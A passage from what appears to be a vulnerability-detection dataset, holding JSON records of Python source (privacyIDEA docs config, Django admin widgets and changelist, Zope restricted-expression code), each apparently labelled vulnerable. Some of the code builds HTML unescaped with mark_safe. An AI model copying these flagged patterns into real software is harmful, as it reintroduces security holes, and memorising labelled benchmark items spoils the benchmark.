ones.\nextensions = ['sphinx.ext.autodoc', 'sphinx.ext.imgmath', 'sphinx.ext.viewcode', \n              'sphinxcontrib.autohttp.flask']\nhttp_index_ignore_prefixes = ['/token']\n\n# Add any paths that contain templates here, relative to this directory.\ntemplates_path = ['_templates']\n\n# The suffix of source filenames.\nsource_suffix = '.rst'\n\n# The encoding of source files.\n#source_encoding = 'utf-8-sig'\n\n# The master toctree document.\nmaster_doc = 'index'\n\n# General information about the project.\nproject = u'privacyIDEA'\ncopyright = u'2014-2017, Cornelius K\u00f6lbel'\n\n# The language for content autogenerated by Sphinx. Refer to documentation\n# for a list of supported languages.\n#language = None\n\n# There are two options for replacing |today|: either, you set today to some\n# non-false value, then it is used:\n#today = ''\n# Else, today_fmt is used as the format for a strftime call.\n#today_fmt = '%B %d, %Y'\n\n# List of patterns, relative to source directory, that match files and\n# directories to ignore when looking for source files.\nexclude_patterns = ['_build']\n\n# The reST default role (used for this markup: `text`) to use for all documents.\n#default_role = None\n\n# If true, '()' will be appended to :func: etc. cross-reference text.\nadd_function_parentheses = True\n\n# If true, the current module name will be prepended to all description\n# unit titles (such as .. function::).\n#add_module_names = True\n\n# If true, sectionauthor and moduleauthor directives will be shown in the\n# output. They are ignored by default.\n#show_authors = False\n\n# The name of the Pygments (syntax highlighting) style to use.\npygments_style = 'sphinx'\n\n# A list of ignored prefixes for module index sorting.\n#modindex_common_prefix = []\n\n\n# -- Options for HTML output ---------------------------------------------------\n\n# The theme to use for HTML and HTML Help pages.  See the documentation for\n# a list of builtin themes.\n#html_theme = 'sphinxdoc'\n#html_theme = 'sphinx_rtd_theme'\n#html_theme = 'agogo'\nhtml_theme = 'flask'\n\n# Theme options are theme-specific and customize the look and feel of a theme\n# further.  For a list of options available for each theme, see the\n# documentation.\n#html_theme_options = {}\n\n# Add any paths that contain custom themes here, relative to this directory.\nhtml_theme_path = ['_themes/flask-sphinx-themes']\n\n\n# The name for this set of Sphinx documents.  If None, it defaults to\n# \"<project> v<release> documentation\".\n#html_title = None\n\n# A shorter title for the navigation bar.  Default is the same as html_title.\n#html_short_title = None\n\n# The name of an image file (relative to this directory) to place at the top\n# of the sidebar.\nhtml_logo = \"images/privacyidea-color.png\"\n\n# The name of an image file (within the static path) to use as favicon of the\n# docs.  This file should be a Windows icon file (.ico) being 16x16 or 32x32\n# pixels large.\n#html_favicon = None\n\n# Add any paths that contain custom static files (such as style sheets) here,\n# relative to this directory. They are copied after the builtin static files,\n# so a file named \"default.css\" will overwrite the builtin \"default.css\".\nhtml_static_path = ['_static']\n\n# If not '', a 'Last updated on:' timestamp is inserted at every page bottom,\n# using the given strftime format.\n#html_last_updated_fmt = '%b %d, %Y'\n\n# If true, SmartyPants will be used to convert quotes and dashes to\n# typographically correct entities.\n#html_use_smartypants = True\n\n# Custom sidebar templates, maps document names to template names.\n#html_sidebars = {}\n\n# Additional templates that should be rendered to pages, maps page names to\n# template names.\n#html_additional_pages = {}\n\n# If false, no module index is generated.\n#html_domain_indices = True\n\n# If false, no index is generated.\n#html_use_index = True\n\n# If true, the index is split into individual pages for each letter.\n#html_split_index = False\n\n# If true, links to the reST sources are added to the pages.\n#html_show_sourcelink = True\n\n# If true, \"Created using Sphinx\" is shown in the HTML footer. Default is True.\n#html_show_sphinx = True\n\n# If true, \"(C) Copyright ...\" is shown in the HTML footer. Default is True.\n#html_show_copyright = True\n\n# If true, an OpenSearch description file will be output, and all pages will\n# contain a <link> tag referring to it.  The value of this option must be the\n# base URL from which the finished HTML is served.\n#html_use_opensearch = ''\n\n# This is the file name suffix for HTML files (e.g. \".xhtml\").\n#html_file_suffix = None\n\n# Output file base name for HTML help builder.\nhtmlhelp_basename = 'privacyIDEAdoc'\n\n\n# -- Options for LaTeX output --------------------------------------------------\n\nlatex_elements = {\n# The paper size ('letterpaper' or 'a4paper').\n#'papersize': 'letterpaper',\n\n# The font size ('10pt', '11pt' or '12pt').\n#'pointsize': '10pt',\n\n# Additional stuff for the LaTeX preamble.\n#'preamble': '',\n}\n\n# Grouping the document tree into LaTeX files. List of tuples\n# (source start file, target name, title, author, documentclass [howto/manual]).\nlatex_documents = [\n  ('index', 'privacyIDEA.tex', u'privacyIDEA Authentication System',\n   u'Cornelius K\u00f6lbel', 'manual'),\n]\n\n# The name of an image file (relative to this directory) to place at the top of\n# the title page.\n#latex_logo = None\n\n# For \"manual\" documents, if this is true, then toplevel headings are parts,\n# not chapters.\n#latex_use_parts = False\n\n# If true, show page references after internal links.\n#latex_show_pagerefs = False\n\n# If true, show URL addresses after external links.\n#latex_show_urls = False\n\n# Documents to append as an appendix to all manuals.\n#latex_appendices = []\n\n# If false, no module index is generated.\n#latex_domain_indices = True\n\n\n# -- Options for manual page output --------------------------------------------\n\n# One entry per manual page. List of tuples\n# (source start file, name, description, authors, manual section).\nman_pages = [\n    ('index', 'privacyidea-server', u'privacyIDEA Authentication System',\n     [u'Cornelius K\u00f6lbel'], 1)\n]\n\n# If true, show URL addresses after external links.\n#man_show_urls = False\n\n\n# -- Options for Texinfo output ------------------------------------------------\n\n# Grouping the document tree into Texinfo files. List of tuples\n# (source start file, target name, title, author,\n#  dir menu entry, description, category)\ntexinfo_documents = [\n  ('index', 'privacyIDEA', u'privacyIDEA AUthentication System',\n   u'Cornelius K\u00f6lbel', 'privacyIDEA', 'One line description of project.',\n   'Miscellaneous'),\n]\n\n# Documents to append as an appendix to all manuals.\n#texinfo_appendices = []\n\n# If false, no module index is generated.\n#texinfo_domain_indices = True\n\n# How to display URL addresses: 'footnote', 'no', or 'inline'.\n#texinfo_show_urls = 'footnote'\n", "target": 1}
{"idx": 1022, "func": "\"\"\"\nForm Widget classes specific to the Django admin site.\n\"\"\"\nfrom __future__ import unicode_literals\n\nimport copy\n\nfrom django import forms\nfrom django.contrib.admin.templatetags.admin_static import static\nfrom django.core.urlresolvers import reverse\nfrom django.forms.widgets import RadioFieldRenderer\nfrom django.forms.util import flatatt\nfrom django.utils.html import escape, format_html, format_html_join, smart_urlquote\nfrom django.utils.text import Truncator\nfrom django.utils.translation import ugettext as _\nfrom django.utils.safestring import mark_safe\nfrom django.utils.encoding import force_text\nfrom django.utils import six\n\n\nclass FilteredSelectMultiple(forms.SelectMultiple):\n    \"\"\"\n    A SelectMultiple with a JavaScript filter interface.\n\n    Note that the resulting JavaScript assumes that the jsi18n\n    catalog has been loaded in the page\n    \"\"\"\n    @property\n    def media(self):\n        js = [\"core.js\", \"SelectBox.js\", \"SelectFilter2.js\"]\n        return forms.Media(js=[static(\"admin/js/%s\" % path) for path in js])\n\n    def __init__(self, verbose_name, is_stacked, attrs=None, choices=()):\n        self.verbose_name = verbose_name\n        self.is_stacked = is_stacked\n        super(FilteredSelectMultiple, self).__init__(attrs, choices)\n\n    def render(self, name, value, attrs=None, choices=()):\n        if attrs is None:\n            attrs = {}\n        attrs['class'] = 'selectfilter'\n        if self.is_stacked:\n            attrs['class'] += 'stacked'\n        output = [super(FilteredSelectMultiple, self).render(name, value, attrs, choices)]\n        output.append('<script type=\"text/javascript\">addEvent(window, \"load\", function(e) {')\n        # TODO: \"id_\" is hard-coded here. This should instead use the correct\n        # API to determine the ID dynamically.\n        output.append('SelectFilter.init(\"id_%s\", \"%s\", %s, \"%s\"); });</script>\\n'\n            % (name, self.verbose_name.replace('\"', '\\\\\"'), int(self.is_stacked), static('admin/')))\n        return mark_safe(''.join(output))\n\nclass AdminDateWidget(forms.DateInput):\n\n    @property\n    def media(self):\n        js = [\"calendar.js\", \"admin/DateTimeShortcuts.js\"]\n        return forms.Media(js=[static(\"admin/js/%s\" % path) for path in js])\n\n    def __init__(self, attrs=None, format=None):\n        final_attrs = {'class': 'vDateField', 'size': '10'}\n        if attrs is not None:\n            final_attrs.update(attrs)\n        super(AdminDateWidget, self).__init__(attrs=final_attrs, format=format)\n\nclass AdminTimeWidget(forms.TimeInput):\n\n    @property\n    def media(self):\n        js = [\"calendar.js\", \"admin/DateTimeShortcuts.js\"]\n        return forms.Media(js=[static(\"admin/js/%s\" % path) for path in js])\n\n    def __init__(self, attrs=None, format=None):\n        final_attrs = {'class': 'vTimeField', 'size': '8'}\n        if attrs is not None:\n            final_attrs.update(attrs)\n        super(AdminTimeWidget, self).__init__(attrs=final_attrs, format=format)\n\nclass AdminSplitDateTime(forms.SplitDateTimeWidget):\n    \"\"\"\n    A SplitDateTime Widget that has some admin-specific styling.\n    \"\"\"\n    def __init__(self, attrs=None):\n        widgets = [AdminDateWidget, AdminTimeWidget]\n        # Note that we're calling MultiWidget, not SplitDateTimeWidget, because\n        # we want to define widgets.\n        forms.MultiWidget.__init__(self, widgets, attrs)\n\n    def format_output(self, rendered_widgets):\n        return format_html('<p class=\"datetime\">{0} {1}<br />{2} {3}</p>',\n                           _('Date:'), rendered_widgets[0],\n                           _('Time:'), rendered_widgets[1])\n\nclass AdminRadioFieldRenderer(RadioFieldRenderer):\n    def render(self):\n        \"\"\"Outputs a <ul> for this set of radio fields.\"\"\"\n        return format_html('<ul{0}>\\n{1}\\n</ul>',\n                           flatatt(self.attrs),\n                           format_html_join('\\n', '<li>{0}</li>',\n                                            ((force_text(w),) for w in self)))\n\nclass AdminRadioSelect(forms.RadioSelect):\n    renderer = AdminRadioFieldRenderer\n\nclass AdminFileWidget(forms.ClearableFileInput):\n    template_with_initial = ('<p class=\"file-upload\">%s</p>'\n                            % forms.ClearableFileInput.template_with_initial)\n    template_with_clear = ('<span class=\"clearable-file-input\">%s</span>'\n                           % forms.ClearableFileInput.template_with_clear)\n\ndef url_params_from_lookup_dict(lookups):\n    \"\"\"\n    Converts the type of lookups specified in a ForeignKey limit_choices_to\n    attribute to a dictionary of query parameters\n    \"\"\"\n    params = {}\n    if lookups and hasattr(lookups, 'items'):\n        items = []\n        for k, v in lookups.items():\n            if callable(v):\n                v = v()\n            if isinstance(v, (tuple, list)):\n                v = ','.join([str(x) for x in v])\n            elif isinstance(v, bool):\n                # See django.db.fields.BooleanField.get_prep_lookup\n                v = ('0', '1')[v]\n            else:\n                v = six.text_type(v)\n            items.append((k, v))\n        params.update(dict(items))\n    return params\n\nclass ForeignKeyRawIdWidget(forms.TextInput):\n    \"\"\"\n    A Widget for displaying ForeignKeys in the \"raw_id\" interface rather than\n    in a <select> box.\n    \"\"\"\n    def __init__(self, rel, admin_site, attrs=None, using=None):\n        self.rel = rel\n        self.admin_site = admin_site\n        self.db = using\n        super(ForeignKeyRawIdWidget, self).__init__(attrs)\n\n    def render(self, name, value, attrs=None):\n        rel_to = self.rel.to\n        if attrs is None:\n            attrs = {}\n        extra = []\n        if rel_to in self.admin_site._registry:\n            # The related object is registered with the same AdminSite\n            related_url = reverse('admin:%s_%s_changelist' %\n                                    (rel_to._meta.app_label,\n                                    rel_to._meta.model_name),\n                                    current_app=self.admin_site.name)\n\n            params = self.url_parameters()\n            if params:\n                url = '?' + '&amp;'.join(['%s=%s' % (k, v) for k, v in params.items()])\n            else:\n                url = ''\n            if \"class\" not in attrs:\n                attrs['class'] = 'vForeignKeyRawIdAdminField' # The JavaScript code looks for this hook.\n            # TODO: \"lookup_id_\" is hard-coded here. This should instead use\n            # the correct API to determine the ID dynamically.\n            extra.append('<a href=\"%s%s\" class=\"related-lookup\" id=\"lookup_id_%s\" onclick=\"return showRelatedObjectLookupPopup(this);\"> '\n                            % (related_url, url, name))\n            extra.append('<img src=\"%s\" width=\"16\" height=\"16\" alt=\"%s\" /></a>'\n                            % (static('admin/img/selector-search.gif'), _('Lookup')))\n        output = [super(ForeignKeyRawIdWidget, self).render(name, value, attrs)] + extra\n        if value:\n            output.append(self.label_for_value(value))\n        return mark_safe(''.join(output))\n\n    def base_url_parameters(self):\n        return url_params_from_lookup_dict(self.rel.limit_choices_to)\n\n    def url_parameters(self):\n        from django.contrib.admin.views.main import TO_FIELD_VAR\n        params = self.base_url_parameters()\n        params.update({TO_FIELD_VAR: self.rel.get_related_field().name})\n        return params\n\n    def label_for_value(self, value):\n        key = self.rel.get_related_field().name\n        try:\n            obj = self.rel.to._default_manager.using(self.db).get(**{key: value})\n            return '&nbsp;<strong>%s</strong>' % escape(Truncator(obj).words(14, truncate='...'))\n        except (ValueError, self.rel.to.DoesNotExist):\n            return ''\n\nclass ManyToManyRawIdWidget(ForeignKeyRawIdWidget):\n    \"\"\"\n    A Widget for displaying ManyToMany ids in the \"raw_id\" interface rather than\n    in a <select multiple> box.\n    \"\"\"\n    def render(self, name, value, attrs=None):\n        if attrs is None:\n            attrs = {}\n        if self.rel.to in self.admin_site._registry:\n            # The related object is registered with the same AdminSite\n            attrs['class'] = 'vManyToManyRawIdAdminField'\n        if value:\n            value = ','.join([force_text(v) for v in value])\n        else:\n            value = ''\n        return super(ManyToManyRawIdWidget, self).render(name, value, attrs)\n\n    def url_parameters(self):\n        return self.base_url_parameters()\n\n    def label_for_value(self, value):\n        return ''\n\n    def value_from_datadict(self, data, files, name):\n        value = data.get(name)\n        if value:\n            return value.split(',')\n\n\nclass RelatedFieldWidgetWrapper(forms.Widget):\n    \"\"\"\n    This class is a wrapper to a given widget to add the add icon for the\n    admin interface.\n    \"\"\"\n    def __init__(self, widget, rel, admin_site, can_add_related=None):\n        self.is_hidden = widget.is_hidden\n        self.needs_multipart_form = widget.needs_multipart_form\n        self.attrs = widget.attrs\n        self.choices = widget.choices\n        self.widget = widget\n        self.rel = rel\n        # Backwards compatible check for whether a user can add related\n        # objects.\n        if can_add_related is None:\n            can_add_related = rel.to in admin_site._registry\n        self.can_add_related = can_add_related\n        # so we can check if the related object is registered with this AdminSite\n        self.admin_site = admin_site\n\n    def __deepcopy__(self, memo):\n        obj = copy.copy(self)\n        obj.widget = copy.deepcopy(self.widget, memo)\n        obj.attrs = self.widget.attrs\n        memo[id(self)] = obj\n        return obj\n\n    @property\n    def media(self):\n        return self.widget.media\n\n    def render(self, name, value, *args, **kwargs):\n        rel_to = self.rel.to\n        info = (rel_to._meta.app_label, rel_to._meta.model_name)\n        self.widget.choices = self.choices\n        output = [self.widget.render(name, value, *args, **kwargs)]\n        if self.can_add_related:\n            related_url = reverse('admin:%s_%s_add' % info, current_app=self.admin_site.name)\n            # TODO: \"add_id_\" is hard-coded here. This should instead use the\n            # correct API to determine the ID dynamically.\n            output.append('<a href=\"%s\" class=\"add-another\" id=\"add_id_%s\" onclick=\"return showAddAnotherPopup(this);\"> '\n                          % (related_url, name))\n            output.append('<img src=\"%s\" width=\"10\" height=\"10\" alt=\"%s\"/></a>'\n                          % (static('admin/img/icon_addlink.gif'), _('Add Another')))\n        return mark_safe(''.join(output))\n\n    def build_attrs(self, extra_attrs=None, **kwargs):\n        \"Helper function for building an attribute dictionary.\"\n        self.attrs = self.widget.build_attrs(extra_attrs=None, **kwargs)\n        return self.attrs\n\n    def value_from_datadict(self, data, files, name):\n        return self.widget.value_from_datadict(data, files, name)\n\n    def id_for_label(self, id_):\n        return self.widget.id_for_label(id_)\n\nclass AdminTextareaWidget(forms.Textarea):\n    def __init__(self, attrs=None):\n        final_attrs = {'class': 'vLargeTextField'}\n        if attrs is not None:\n            final_attrs.update(attrs)\n        super(AdminTextareaWidget, self).__init__(attrs=final_attrs)\n\nclass AdminTextInputWidget(forms.TextInput):\n    def __init__(self, attrs=None):\n        final_attrs = {'class': 'vTextField'}\n        if attrs is not None:\n            final_attrs.update(attrs)\n        super(AdminTextInputWidget, self).__init__(attrs=final_attrs)\n\nclass AdminEmailInputWidget(forms.EmailInput):\n    def __init__(self, attrs=None):\n        final_attrs = {'class': 'vTextField'}\n        if attrs is not None:\n            final_attrs.update(attrs)\n        super(AdminEmailInputWidget, self).__init__(attrs=final_attrs)\n\nclass AdminURLFieldWidget(forms.URLInput):\n    def __init__(self, attrs=None):\n        final_attrs = {'class': 'vURLField'}\n        if attrs is not None:\n            final_attrs.update(attrs)\n        super(AdminURLFieldWidget, self).__init__(attrs=final_attrs)\n\n    def render(self, name, value, attrs=None):\n        html = super(AdminURLFieldWidget, self).render(name, value, attrs)\n        if value:\n            value = force_text(self._format_value(value))\n            final_attrs = {'href': mark_safe(smart_urlquote(value))}\n            html = format_html(\n                '<p class=\"url\">{0} <a {1}>{2}</a><br />{3} {4}</p>',\n                _('Currently:'), flatatt(final_attrs), value,\n                _('Change:'), html\n            )\n        return html\n\n\nclass AdminIntegerFieldWidget(forms.TextInput):\n    class_name = 'vIntegerField'\n\n    def __init__(self, attrs=None):\n        final_attrs = {'class': self.class_name}\n        if attrs is not None:\n            final_attrs.update(attrs)\n        super(AdminIntegerFieldWidget, self).__init__(attrs=final_attrs)\n\nclass AdminBigIntegerFieldWidget(AdminIntegerFieldWidget):\n    class_name = 'vBigIntegerField'\n\nclass AdminCommaSeparatedIntegerFieldWidget(forms.TextInput):\n    def __init__(self, attrs=None):\n        final_attrs = {'class': 'vCommaSeparatedIntegerField'}\n        if attrs is not None:\n            final_attrs.update(attrs)\n        super(AdminCommaSeparatedIntegerFieldWidget, self).__init__(attrs=final_attrs)\n", "target": 1}
{"idx": 1023, "func": "##############################################################################\n#\n# Copyright (c) 2002 Zope Corporation and Contributors. All Rights Reserved.\n#\n# This software is subject to the provisions of the Zope Public License,\n# Version 2.1 (ZPL).  A copy of the ZPL should accompany this distribution.\n# THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY AND ALL EXPRESS OR IMPLIED\n# WARRANTIES ARE DISCLAIMED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED\n# WARRANTIES OF TITLE, MERCHANTABILITY, AGAINST INFRINGEMENT, AND FITNESS\n# FOR A PARTICULAR PURPOSE\n#\n##############################################################################\n\"\"\"Zope-specific Python Expression Handler\n\nHandler for Python expressions that uses the RestrictedPython package.\n\n$Id$\n\"\"\"\nfrom AccessControl import safe_builtins\nfrom AccessControl.ZopeGuards import guarded_getattr, get_safe_globals\nfrom RestrictedPython import compile_restricted_eval\nfrom zope.tales.tales import CompilerError\nfrom zope.tales.pythonexpr import PythonExpr\n\nclass PythonExpr(PythonExpr):\n    _globals = get_safe_globals()\n    _globals['_getattr_'] = guarded_getattr\n    _globals['__debug__' ] = __debug__\n\n    def __init__(self, name, expr, engine):\n        self.text = self.expr = text = expr.strip().replace('\\n', ' ')\n\n        # Unicode expression are not handled properly by RestrictedPython\n        # We convert the expression to UTF-8 (ajung)\n        if isinstance(text, unicode):\n            text = text.encode('utf-8')\n        code, err, warn, use = compile_restricted_eval(text, \n                                                       self.__class__.__name__)\n        if err:\n            raise engine.getCompilerError()('Python expression error:\\n%s' %\n                                            '\\n'.join(err))            \n        self._varnames = use.keys()\n        self._code = code\n\n    def __call__(self, econtext):\n        __traceback_info__ = self.text\n        vars = self._bind_used_names(econtext, {})\n        vars.update(self._globals)\n        return eval(self._code, vars, {})\n\nclass _SecureModuleImporter:\n    __allow_access_to_unprotected_subobjects__ = True\n\n    def __getitem__(self, module):\n        mod = safe_builtins['__import__'](module)\n        path = module.split('.')\n        for name in path[1:]:\n            mod = getattr(mod, name)\n        return mod\n\nfrom DocumentTemplate.DT_Util import TemplateDict, InstanceDict\nfrom AccessControl.DTML import RestrictedDTML\nclass Rtd(RestrictedDTML, TemplateDict):\n    this = None\n\ndef call_with_ns(f, ns, arg=1):\n    td = Rtd()\n    # prefer 'context' to 'here';  fall back to 'None'\n    this = ns.get('context', ns.get('here'))\n    td.this = this\n    request = ns.get('request', {})\n    td._push(request)\n    td._push(InstanceDict(td.this, td))\n    td._push(ns)\n    try:\n        if arg==2:\n            return f(None, td)\n        else:\n            return f(td)\n    finally:\n        td._pop(3)\n", "target": 1}
{"idx": 1024, "func": "from collections import OrderedDict\nimport sys\nimport warnings\n\nfrom django.core.exceptions import SuspiciousOperation, ImproperlyConfigured\nfrom django.core.paginator import InvalidPage\nfrom django.core.urlresolvers import reverse\nfrom django.db import models\nfrom django.db.models.fields import FieldDoesNotExist\nfrom django.utils import six\nfrom django.utils.deprecation import RenameMethodsBase, RemovedInDjango18Warning\nfrom django.utils.encoding import force_text\nfrom django.utils.translation import ugettext, ugettext_lazy\nfrom django.utils.http import urlencode\n\nfrom django.contrib.admin import FieldListFilter\nfrom django.contrib.admin.exceptions import (\n    DisallowedModelAdminLookup, DisallowedModelAdminToField,\n)\nfrom django.contrib.admin.options import IncorrectLookupParameters, IS_POPUP_VAR, TO_FIELD_VAR\nfrom django.contrib.admin.utils import (quote, get_fields_from_path,\n    lookup_needs_distinct, prepare_lookup_value)\n\n# Changelist settings\nALL_VAR = 'all'\nORDER_VAR = 'o'\nORDER_TYPE_VAR = 'ot'\nPAGE_VAR = 'p'\nSEARCH_VAR = 'q'\nERROR_FLAG = 'e'\n\nIGNORED_PARAMS = (\n    ALL_VAR, ORDER_VAR, ORDER_TYPE_VAR, SEARCH_VAR, IS_POPUP_VAR, TO_FIELD_VAR)\n\n# Text to display within change-list table cells if the value is blank.\nEMPTY_CHANGELIST_VALUE = ugettext_lazy('(None)')\n\n\ndef _is_changelist_popup(request):\n    \"\"\"\n    Returns True if the popup GET parameter is set.\n\n    This function is introduced to facilitate deprecating the legacy\n    value for IS_POPUP_VAR and should be removed at the end of the\n    deprecation cycle.\n    \"\"\"\n\n    if IS_POPUP_VAR in request.GET:\n        return True\n\n    IS_LEGACY_POPUP_VAR = 'pop'\n    if IS_LEGACY_POPUP_VAR in request.GET:\n        warnings.warn(\n            \"The `%s` GET parameter has been renamed to `%s`.\" %\n            (IS_LEGACY_POPUP_VAR, IS_POPUP_VAR),\n            RemovedInDjango18Warning, 2)\n        return True\n\n    return False\n\n\nclass RenameChangeListMethods(RenameMethodsBase):\n    renamed_methods = (\n        ('get_query_set', 'get_queryset', RemovedInDjango18Warning),\n    )\n\n\nclass ChangeList(six.with_metaclass(RenameChangeListMethods)):\n    def __init__(self, request, model, list_display, list_display_links,\n            list_filter, date_hierarchy, search_fields, list_select_related,\n            list_per_page, list_max_show_all, list_editable, model_admin):\n        self.model = model\n        self.opts = model._meta\n        self.lookup_opts = self.opts\n        self.root_queryset = model_admin.get_queryset(request)\n        self.list_display = list_display\n        self.list_display_links = list_display_links\n        self.list_filter = list_filter\n        self.date_hierarchy = date_hierarchy\n        self.search_fields = search_fields\n        self.list_select_related = list_select_related\n        self.list_per_page = list_per_page\n        self.list_max_show_all = list_max_show_all\n        self.model_admin = model_admin\n        self.preserved_filters = model_admin.get_preserved_filters(request)\n\n        # Get search parameters from the query string.\n        try:\n            self.page_num = int(request.GET.get(PAGE_VAR, 0))\n        except ValueError:\n            self.page_num = 0\n        self.show_all = ALL_VAR in request.GET\n        self.is_popup = _is_changelist_popup(request)\n        to_field = request.GET.get(TO_FIELD_VAR)\n        if to_field and not model_admin.to_field_allowed(request, to_field):\n            raise DisallowedModelAdminToField(\"The field %s cannot be referenced.\" % to_field)\n        self.to_field = to_field\n        self.params = dict(request.GET.items())\n        if PAGE_VAR in self.params:\n            del self.params[PAGE_VAR]\n        if ERROR_FLAG in self.params:\n            del self.params[ERROR_FLAG]\n\n        if self.is_popup:\n            self.list_editable = ()\n        else:\n            self.list_editable = list_editable\n        self.query = request.GET.get(SEARCH_VAR, '')\n        self.queryset = self.get_queryset(request)\n        self.get_results(request)\n        if self.is_popup:\n            title = ugettext('Select %s')\n        else:\n            title = ugettext('Select %s to change')\n        self.title = title % force_text(self.opts.verbose_name)\n        self.pk_attname = self.lookup_opts.pk.attname\n\n    @property\n    def root_query_set(self):\n        warnings.warn(\"`ChangeList.root_query_set` is deprecated, \"\n                      \"use `root_queryset` instead.\",\n                      RemovedInDjango18Warning, 2)\n        return self.root_queryset\n\n    @property\n    def query_set(self):\n        warnings.warn(\"`ChangeList.query_set` is deprecated, \"\n                      \"use `queryset` instead.\",\n                      RemovedInDjango18Warning, 2)\n        return self.queryset\n\n    def get_filters_params(self, params=None):\n        \"\"\"\n        Returns all params except IGNORED_PARAMS\n        \"\"\"\n        if not params:\n            params = self.params\n        lookup_params = params.copy()  # a dictionary of the query string\n        # Remove all the parameters that are globally and systematically\n        # ignored.\n        for ignored in IGNORED_PARAMS:\n            if ignored in lookup_params:\n                del lookup_params[ignored]\n        return lookup_params\n\n    def get_filters(self, request):\n        lookup_params = self.get_filters_params()\n        use_distinct = False\n\n        for key, value in lookup_params.items():\n            if not self.model_admin.lookup_allowed(key, value):\n                raise DisallowedModelAdminLookup(\"Filtering by %s not allowed\" % key)\n\n        filter_specs = []\n        if self.list_filter:\n            for list_filter in self.list_filter:\n                if callable(list_filter):\n                    # This is simply a custom list filter class.\n                    spec = list_filter(request, lookup_params,\n                        self.model, self.model_admin)\n                else:\n                    field_path = None\n                    if isinstance(list_filter, (tuple, list)):\n                        # This is a custom FieldListFilter class for a given field.\n                        field, field_list_filter_class = list_filter\n                    else:\n                        # This is simply a field name, so use the default\n                        # FieldListFilter class that has been registered for\n                        # the type of the given field.\n                        field, field_list_filter_class = list_filter, FieldListFilter.create\n                    if not isinstance(field, models.Field):\n                        field_path = field\n                        field = get_fields_from_path(self.model, field_path)[-1]\n                    spec = field_list_filter_class(field, request, lookup_params,\n                        self.model, self.model_admin, field_path=field_path)\n                    # Check if we need to use distinct()\n                    use_distinct = (use_distinct or\n                                    lookup_needs_distinct(self.lookup_opts,\n                                                          field_path))\n                if spec and spec.has_output():\n                    filter_specs.append(spec)\n\n        # At this point, all the parameters used by the various ListFilters\n        # have been removed from lookup_params, which now only contains other\n        # parameters passed via the query string. We now loop through the\n        # remaining parameters both to ensure that all the parameters are valid\n        # fields and to determine if at least one of them needs distinct(). If\n        # the lookup parameters aren't real fields, then bail out.\n        try:\n            for key, value in lookup_params.items():\n                lookup_params[key] = prepare_lookup_value(key, value)\n                use_distinct = (use_distinct or\n                                lookup_needs_distinct(self.lookup_opts, key))\n            return filter_specs, bool(filter_specs), lookup_params, use_distinct\n        except FieldDoesNotExist as e:\n            six.reraise(IncorrectLookupParameters, IncorrectLookupParameters(e), sys.exc_info()[2])\n\n    def get_query_string(self, new_params=None, remove=None):\n        if new_params is None:\n            new_params = {}\n        if remove is None:\n            remove = []\n        p = self.params.copy()\n        for r in remove:\n            for k in list(p):\n                if k.startswith(r):\n                    del p[k]\n        for k, v in new_params.items():\n            if v is None:\n                if k in p:\n                    del p[k]\n            else:\n                p[k] = v\n        return '?%s' % urlencode(sorted(p.items()))\n\n    def get_results(self, request):\n        paginator = self.model_admin.get_paginator(request, self.queryset, self.list_per_page)\n        # Get the number of objects, with admin filters applied.\n        result_count = paginator.count\n\n        # Get the total number of objects, with no admin filters applied.\n        # Perform a slight optimization:\n        # full_result_count is equal to paginator.count if no filters\n        # were applied\n        if self.get_filters_params() or self.params.get(SEARCH_VAR):\n            full_result_count = self.root_queryset.count()\n        else:\n            full_result_count = result_count\n        can_show_all = result_count <= self.list_max_show_all\n        multi_page = result_count > self.list_per_page\n\n        # Get the list of objects to display on this page.\n        if (self.show_all and can_show_all) or not multi_page:\n            result_list = self.queryset._clone()\n        else:\n            try:\n                result_list = paginator.page(self.page_num + 1).object_list\n            except InvalidPage:\n                raise IncorrectLookupParameters\n\n        self.result_count = result_count\n        self.full_result_count = full_result_count\n        self.result_list = result_list\n        self.can_show_all = can_show_all\n        self.multi_page = multi_page\n        self.paginator = paginator\n\n    def _get_default_ordering(self):\n        ordering = []\n        if self.model_admin.ordering:\n            ordering = self.model_admin.ordering\n        elif self.lookup_opts.ordering:\n            ordering = self.lookup_opts.ordering\n        return ordering\n\n    def get_ordering_field(self, field_name):\n        \"\"\"\n        Returns the proper model field name corresponding to the given\n        field_name to use for ordering. field_name may either be the name of a\n        proper model field or the name of a method (on the admin or model) or a\n        callable with the 'admin_order_field' attribute. Returns None if no\n        proper model field name can be matched.\n        \"\"\"\n        try:\n            field = self.lookup_opts.get_field(field_name)\n            return field.name\n        except models.FieldDoesNotExist:\n            # See whether field_name is a name of a non-field\n            # that allows sorting.\n            if callable(field_name):\n                attr = field_name\n            elif hasattr(self.model_admin, field_name):\n                attr = getattr(self.model_admin, field_name)\n            else:\n                attr = getattr(self.model, field_name)\n            return getattr(attr, 'admin_order_field', None)\n\n    def get_ordering(self, request, queryset):\n        \"\"\"\n        Returns the list of ordering fields for the change list.\n        First we check the get_ordering() method in model admin, then we check\n        the object's default ordering. Then, any manually-specified ordering\n        from the query string overrides anything. Finally, a deterministic\n        order is guaranteed by ensuring the primary key is used as the last\n        ordering field.\n        \"\"\"\n        params = self.params\n        ordering = list(self.model_admin.get_ordering(request)\n                        or self._get_default_ordering())\n        if ORDER_VAR in params:\n            # Clear ordering and used params\n            ordering = []\n            order_params = params[ORDER_VAR].split('.')\n            for p in order_params:\n                try:\n                    none, pfx, idx = p.rpartition('-')\n                    field_name = self.list_display[int(idx)]\n                    order_field = self.get_ordering_field(field_name)\n                    if not order_field:\n                        continue  # No 'admin_order_field', skip it\n                    # reverse order if order_field has already \"-\" as prefix\n                    if order_field.startswith('-') and pfx == \"-\":\n                        ordering.append(order_field[1:])\n                    else:\n                        ordering.append(pfx + order_field)\n                except (IndexError, ValueError):\n                    continue  # Invalid ordering specified, skip it.\n\n        # Add the given query's ordering fields, if any.\n        ordering.extend(queryset.query.order_by)\n\n        # Ensure that the primary key is systematically present in the list of\n        # ordering fields so we can guarantee a deterministic order across all\n        # database backends.\n        pk_name = self.lookup_opts.pk.name\n        if not (set(ordering) & set(['pk', '-pk', pk_name, '-' + pk_name])):\n            # The two sets do not intersect, meaning the pk isn't present. So\n            # we add it.\n            ordering.append('-pk')\n\n        return ordering\n\n    def get_ordering_field_columns(self):\n        \"\"\"\n        Returns an OrderedDict of ordering field column numbers and asc/desc\n        \"\"\"\n\n        # We must cope with more than one column having the same underlying sort\n        # field, so we base things on column numbers.\n        ordering = self._get_default_ordering()\n        ordering_fields = OrderedDict()\n        if ORDER_VAR not in self.params:\n            